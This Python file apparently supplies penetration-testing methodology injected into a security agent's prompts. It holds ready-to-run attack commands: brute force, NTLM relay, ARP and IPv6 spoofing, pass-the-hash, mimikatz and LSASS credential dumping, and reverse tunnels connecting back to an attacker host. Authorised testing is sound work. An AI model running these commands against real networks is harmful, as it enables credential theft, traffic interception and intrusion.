"""Network security knowledge base.

Deep knowledge about network security testing:
1. Network reconnaissance
2. Service exploitation
3. Network pivoting
4. Protocol attacks
5. Lateral movement
"""

from __future__ import annotations

from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class NetworkVulnPattern:
    """A network vulnerability pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    protocols: list[str] = field(default_factory=list)
    mitre_tactic: str = ""
    description: str = ""
    testing_methodology: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:30],
            "category": self.category[:12],
        }


NETWORK_VULN_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "net-001", "name": "Network Reconnaissance",
        "category": "recon", "severity": "medium",
        "protocols": ["ICMP", "TCP", "UDP", "ARP"],
        "mitre": "TA0043",
        "desc": "Network enumeration and mapping.",
        "testing": (
            "NETWORK RECONNAISSANCE:\n"
            "1. HOST DISCOVERY:\n"
            "   - ARP scan (LAN):\n"
            "     arp-scan -l\n"
            "     nmap -sn -PR 192.168.1.0/24\n"
            "   - ICMP sweep:\n"
            "     nmap -sn -PE 10.0.0.0/8\n"
            "   - TCP SYN discovery:\n"
            "     nmap -sn -PS80,443,22,445 10.0.0.0/24\n"
            "   - UDP discovery:\n"
            "     nmap -sn -PU53,161,500 10.0.0.0/24\n"
            "2. PORT SCANNING:\n"
            "   - TCP SYN scan (fast):\n"
            "     nmap -sS -T4 --top-ports 1000 {target}\n"
            "   - Full port scan:\n"
            "     nmap -sS -p- --min-rate 10000 {target}\n"
            "   - UDP scan (slow):\n"
            "     nmap -sU --top-ports 100 {target}\n"
            "   - Version detection:\n"
            "     nmap -sV -sC -p{ports} {target}\n"
            "   - masscan (ultra-fast):\n"
            "     masscan {cidr} -p1-65535 --rate 100000\n"
            "3. SERVICE ENUMERATION:\n"
            "   - Banner grabbing:\n"
            "     nmap -sV --version-intensity 5 {target}\n"
            "   - Script scanning:\n"
            "     nmap --script=default,vuln {target}\n"
            "   - SMB enumeration:\n"
            "     enum4linux -a {target}\n"
            "     smbclient -L \\\\{target}\n"
            "   - SNMP enumeration:\n"
            "     snmpwalk -v2c -c public {target}\n"
            "     onesixtyone -c community.txt {target}\n"
            "   - DNS enumeration:\n"
            "     dnsrecon -d {domain}\n"
            "     dig axfr @{dns_server} {domain}\n"
            "4. OS FINGERPRINTING:\n"
            "   - Active: nmap -O {target}\n"
            "   - Passive: p0f on network tap"
        ),
        "tools": ["nmap", "masscan", "enum4linux", "dnsrecon"],
    },
    {
        "id": "net-002", "name": "Service Exploitation",
        "category": "exploitation", "severity": "critical",
        "protocols": ["SMB", "SSH", "RDP", "FTP", "HTTP", "SNMP"],
        "mitre": "TA0001",
        "desc": "Network service exploitation techniques.",
        "testing": (
            "SERVICE EXPLOITATION:\n"
            "1. SMB (445):\n"
            "   - EternalBlue (MS17-010):\n"
            "     nmap --script smb-vuln-ms17-010 {target}\n"
            "   - Null session:\n"
            "     smbclient -N -L \\\\{target}\n"
            "   - Relay attacks:\n"
            "     responder -I eth0 -wrf\n"
            "     ntlmrelayx.py -t {target} -smb2support\n"
            "   - Password spraying:\n"
            "     crackmapexec smb {targets} -u users.txt -p password.txt\n"
            "2. SSH (22):\n"
            "   - Brute force:\n"
            "     hydra -L users.txt -P pass.txt ssh://{target}\n"
            "   - Key-based auth testing\n"
            "   - Username enumeration (CVE-2018-15473):\n"
            "     ssh-audit {target}\n"
            "3. RDP (3389):\n"
            "   - BlueKeep (CVE-2019-0708):\n"
            "     nmap --script rdp-vuln-ms12-020 {target}\n"
            "   - NLA bypass\n"
            "   - Brute force:\n"
            "     crowbar -b rdp -s {target}/32 -u admin -C pass.txt\n"
            "4. FTP (21):\n"
            "   - Anonymous login:\n"
            "     ftp {target} → anonymous:anonymous@\n"
            "   - vsftpd 2.3.4 backdoor\n"
            "   - ProFTPD mod_copy (unauthenticated file copy)\n"
            "5. SNMP (161):\n"
            "   - Default community strings:\n"
            "     onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt {target}\n"
            "   - SNMPv3 user enumeration\n"
            "6. DNS (53):\n"
            "   - Zone transfer:\n"
            "     dig axfr @{ns} {domain}\n"
            "   - DNS cache poisoning\n"
            "   - DNS rebinding"
        ),
        "tools": ["nmap", "hydra", "crackmapexec", "responder", "ntlmrelayx"],
    },
    {
        "id": "net-003", "name": "Network Pivoting",
        "category": "pivoting", "severity": "high",
        "protocols": ["TCP", "SSH", "SOCKS"],
        "mitre": "TA0008",
        "desc": "Network pivoting and tunneling.",
        "testing": (
            "NETWORK PIVOTING:\n"
            "1. SSH TUNNELING:\n"
            "   - Local port forward:\n"
            "     ssh -L 8080:{internal}:80 user@{pivot}\n"
            "   - Dynamic SOCKS proxy:\n"
            "     ssh -D 1080 user@{pivot}\n"
            "     proxychains nmap -sT {internal_target}\n"
            "   - Remote port forward:\n"
            "     ssh -R 4444:localhost:4444 user@{pivot}\n"
            "2. CHISEL:\n"
            "   - Server (attacker): chisel server --reverse -p 8000\n"
            "   - Client (pivot): chisel client {attacker}:8000 R:socks\n"
            "   - Then: proxychains nmap {internal}\n"
            "3. LIGOLO-NG:\n"
            "   - Proxy (attacker): ./proxy -selfcert\n"
            "   - Agent (pivot): ./agent -connect {attacker}:11601 -ignore-cert\n"
            "   - Create tunnel interface on attacker\n"
            "   - Route internal subnets through tunnel\n"
            "4. DOUBLE PIVOT:\n"
            "   - Pivot 1 → Pivot 2 → Target\n"
            "   - SSH chaining: ssh -J user@pivot1 user@pivot2\n"
            "   - Nested SOCKS proxies\n"
            "5. PORT FORWARDING:\n"
            "   - socat: socat TCP-LISTEN:8080,fork TCP:{target}:80\n"
            "   - netsh (Windows): netsh interface portproxy add v4tov4\n"
            "   - iptables: iptables -t nat -A PREROUTING ...\n"
            "6. DNS TUNNELING:\n"
            "   - dnscat2: DNS-based C2 channel\n"
            "   - iodine: IP over DNS tunnel"
        ),
        "tools": ["ssh", "chisel", "ligolo-ng", "proxychains", "socat"],
    },
    {
        "id": "net-004", "name": "Protocol Attacks",
        "category": "protocol", "severity": "high",
        "protocols": ["ARP", "DHCP", "DNS", "LLMNR", "NBT-NS", "mDNS", "VLAN"],
        "mitre": "TA0006",
        "desc": "Layer 2/3 protocol attacks.",
        "testing": (
            "PROTOCOL ATTACKS:\n"
            "1. ARP:\n"
            "   - ARP spoofing/poisoning:\n"
            "     arpspoof -i eth0 -t {target} {gateway}\n"
            "     ettercap -T -M arp:remote /{target}// /{gateway}//\n"
            "   - MITM traffic interception\n"
            "2. LLMNR/NBT-NS/mDNS:\n"
            "   - Responder (poison name resolution):\n"
            "     responder -I eth0 -wrf\n"
            "   - Capture NTLMv2 hashes\n"
            "   - Relay captured hashes:\n"
            "     ntlmrelayx.py -tf targets.txt -smb2support\n"
            "3. DHCP:\n"
            "   - DHCP starvation:\n"
            "     Exhaust DHCP pool\n"
            "   - Rogue DHCP server:\n"
            "     Set attacker as gateway → MITM\n"
            "4. VLAN:\n"
            "   - VLAN hopping (switch spoofing):\n"
            "     DTP negotiation to become trunk port\n"
            "   - Double tagging:\n"
            "     802.1Q double-encapsulated frames\n"
            "   - VLAN enumeration:\n"
            "     yersinia -I (interactive mode)\n"
            "5. IPv6:\n"
            "   - Router advertisement spoofing:\n"
            "     * Inject malicious IPv6 router advertisements\n"
            "     * Redirect traffic through attacker\n"
            "   - mitm6: IPv6 MITM + WPAD/DNS takeover\n"
            "     mitm6 -d {domain}\n"
            "     ntlmrelayx.py -6 -t ldaps://{dc} --delegate-access\n"
            "6. ROUTING:\n"
            "   - BGP hijacking (ISP level)\n"
            "   - OSPF/EIGRP route injection"
        ),
        "tools": ["responder", "ntlmrelayx", "ettercap", "yersinia", "mitm6"],
    },
    {
        "id": "net-005", "name": "Lateral Movement",
        "category": "lateral", "severity": "critical",
        "protocols": ["SMB", "WMI", "WinRM", "RDP", "SSH", "DCOM"],
        "mitre": "TA0008",
        "desc": "Post-exploitation lateral movement techniques.",
        "testing": (
            "LATERAL MOVEMENT:\n"
            "1. PASS-THE-HASH:\n"
            "   - crackmapexec:\n"
            "     cme smb {targets} -u admin -H {ntlm_hash} --exec-method smbexec\n"
            "   - impacket:\n"
            "     psexec.py admin@{target} -hashes :{ntlm_hash}\n"
            "     wmiexec.py admin@{target} -hashes :{ntlm_hash}\n"
            "     smbexec.py admin@{target} -hashes :{ntlm_hash}\n"
            "2. PASS-THE-TICKET:\n"
            "   - Kerberos ticket extraction:\n"
            "     mimikatz: sekurlsa::tickets /export\n"
            "   - Ticket injection:\n"
            "     export KRB5CCNAME=ticket.ccache\n"
            "     psexec.py -k -no-pass {target}\n"
            "3. WINRM:\n"
            "   - evil-winrm:\n"
            "     evil-winrm -i {target} -u admin -H {hash}\n"
            "   - PowerShell remoting:\n"
            "     Enter-PSSession -ComputerName {target} -Credential admin\n"
            "4. DCOM:\n"
            "   - dcomexec.py:\n"
            "     dcomexec.py admin@{target} -hashes :{hash}\n"
            "5. SSH KEY REUSE:\n"
            "   - Find SSH keys: find / -name id_rsa 2>/dev/null\n"
            "   - Try keys on other hosts:\n"
            "     ssh -i found_key user@{other_host}\n"
            "6. CREDENTIAL HARVESTING:\n"
            "   - mimikatz: sekurlsa::logonpasswords\n"
            "   - LaZagne: Extract credentials from software\n"
            "   - Dump LSASS: procdump -ma lsass.exe\n"
            "   - SAM dump: reg save HKLM\\SAM sam.bak"
        ),
        "tools": ["crackmapexec", "impacket", "evil-winrm", "mimikatz", "LaZagne"],
    },
]


class NetworkSecurityKB:
    """Network security knowledge base.

    Provides network security testing methodology
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, NetworkVulnPattern] = {}
        self._log = logger.bind(component="network_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load network vulnerability patterns."""
        for data in NETWORK_VULN_PATTERNS:
            pattern = NetworkVulnPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                protocols=data.get("protocols", []),
                mitre_tactic=data.get("mitre", ""),
                description=data.get("desc", ""),
                testing_methodology=data.get("testing", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_patterns_for_category(
        self,
        category: str,
    ) -> list[NetworkVulnPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category == category
        ]

    def get_patterns_for_protocol(
        self,
        protocol: str,
    ) -> list[NetworkVulnPattern]:
        """Get patterns for a protocol."""
        return [
            p for p in self._patterns.values()
            if protocol.upper() in [pr.upper() for pr in p.protocols]
        ]

    def build_network_prompt(
        self,
        categories: list[str] | None = None,
        protocol: str = "",
        max_patterns: int = 3,
    ) -> str:
        """Build network security prompt."""
        if protocol:
            relevant = self.get_patterns_for_protocol(protocol)
        elif categories:
            relevant = []
            for cat in categories:
                relevant.extend(self.get_patterns_for_category(cat))
        else:
            relevant = list(self._patterns.values())

        lines = ["## Network Security Testing\n"]
        for pattern in relevant[:max_patterns]:
            lines.append(f"### {pattern.name} [{pattern.severity.upper()}]")
            if pattern.mitre_tactic:
                lines.append(f"MITRE Tactic: {pattern.mitre_tactic}")
            lines.append(pattern.testing_methodology)
            lines.append("")

        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = defaultdict(int)
        proto_set: set[str] = set()
        for p in self._patterns.values():
            cat_counts[p.category] += 1
            proto_set.update(p.protocols)
        return {
            "patterns": len(self._patterns),
            "protocols": len(proto_set),
            "by_category": dict(cat_counts),
        }
